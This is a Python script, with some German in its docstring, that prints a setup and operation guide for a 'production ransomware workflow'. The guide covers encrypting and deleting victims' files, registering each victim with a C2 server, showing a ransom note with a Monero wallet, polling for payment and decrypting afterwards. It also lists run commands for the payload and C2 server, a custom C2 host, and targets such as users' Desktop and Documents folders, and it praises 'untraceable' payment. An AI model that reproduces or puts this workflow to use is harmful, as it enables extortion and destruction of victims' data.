#!/usr/bin/env python3
"""
PRODUCTION SETUP GUIDE
======================
Kompletter Produktions-Workflow
"""

import subprocess
import sys
import os

def print_banner():
    print("""
╔════════════════════════════════════════════════════════════════════╗
║                  PRODUCTION RANSOMWARE WORKFLOW                   ║
║                    Complete Attack Chain                           ║
╚════════════════════════════════════════════════════════════════════╝
    """)

def print_workflow():
    print("""
┌────────────────────────────────────────────────────────────────────┐
│                         WORKFLOW PHASES                            │
└────────────────────────────────────────────────────────────────────┘

PHASE 1: ENCRYPTION (Victim Machine)
├─ Generate random Master Key (256-bit)
├─ Scan target directories
├─ Encrypt files with AES-256 + PBKDF2
│  └─ Each file: [16-byte Salt] + [Encrypted Data]
├─ Delete original files
└─ Collect encryption metadata

PHASE 2: C2 REGISTRATION
├─ Send ransom_id, monero_address, encryption metadata
├─ C2 Server stores victim in database
└─ Master Key is stored encrypted on server

PHASE 3: DISPLAY RANSOM NOTE
├─ Show professional GUI or text file
├─ Display monero wallet address
├─ Set payment deadline (24 hours)
└─ List encrypted file statistics

PHASE 4: PAYMENT MONITORING
├─ Poll C2 server every 30 seconds
├─ Check /api/v1/payment/status/{ransom_id}
├─ If payment detected: PROCEED TO PHASE 5
└─ If no payment: KEEP WAITING

PHASE 5: DEPLOY DECRYPTION KEY
├─ Request decryption key from C2 server
├─ Initialize DecryptionEngine with Master Key
├─ Decrypt all .LOCKED files in background
├─ Restore original filenames
└─ Delete encrypted files

┌────────────────────────────────────────────────────────────────────┐
│                         QUICK START                                │
└────────────────────────────────────────────────────────────────────┘

TERMINAL 1 - Start C2 Server:
$ cd production
$ python c2_server.py

TERMINAL 2 - Run Payload (with test directory):
$ cd production
$ python payload.py --c2-host 127.0.0.1 --c2-port 5000 --target-dirs C:\\test_files

TERMINAL 3 - Monitor & Simulate Payment:
$ cd ../
$ python complete_payment_flow.py <ransom_id> <monero_wallet>

EXPECTED OUTPUT:
┌─ Encryption complete
├─ Registered with C2
├─ Ransom note displayed
├─ Waiting for payment...
├─ [Payment detected!]
├─ Decryption key received
├─ Files being decrypted...
└─ Decryption complete!

┌────────────────────────────────────────────────────────────────────┐
│                    FILE STRUCTURE                                  │
└────────────────────────────────────────────────────────────────────┘

production/
├── payload.py          ← Main ransomware payload
├── c2_server.py        ← C2 backend server
└── README.md           ← This file

../crypt/
├── encryption_engine.py     ← AES-256 encryption
├── decryption_engine.py     ← AES-256 decryption
├── encryptor.py             ← Standalone encryption tool
└── decryptor.py             ← Standalone decryption tool

┌────────────────────────────────────────────────────────────────────┐
│                    SECURITY FEATURES                               │
└────────────────────────────────────────────────────────────────────┘

✓ AES-256 encryption (via Fernet)
✓ PBKDF2 key derivation (100,000 iterations)
✓ Random salt per file (16 bytes)
✓ Master Key never transmitted in plaintext
✓ Victim database encrypted on server
✓ Monero payment (untraceable)
✓ Automatic decryption after payment

┌────────────────────────────────────────────────────────────────────┐
│                    TESTING CHECKLIST                               │
└────────────────────────────────────────────────────────────────────┘

□ Create test directory: mkdir C:\\test_files
□ Add test files to directory
□ Start C2 server: python c2_server.py
□ Run payload: python payload.py --target-dirs C:\\test_files
□ Verify files are encrypted (.LOCKED extension)
□ Check C2 database: SELECT * FROM production_victims.db
□ Simulate payment: python complete_payment_flow.py <id> <wallet>
□ Verify files are decrypted
□ Check .LOCKED files are deleted

┌────────────────────────────────────────────────────────────────────┐
│                    ADVANCED OPTIONS                                │
└────────────────────────────────────────────────────────────────────┘

Custom C2 Server:
$ python payload.py --c2-host 192.168.1.100 --c2-port 5000

Multiple Target Directories:
$ python payload.py --target-dirs C:\\Users\\Desktop C:\\Users\\Documents

Custom Ransom Amount:
# Edit payload.py, change: self.ransom_amount = 0.5

Custom Encryption Extension:
# Edit payload.py, change: encryption_extension=".LOCKED"

    """)

def main():
    print_banner()
    print_workflow()

if __name__ == '__main__':
    main()
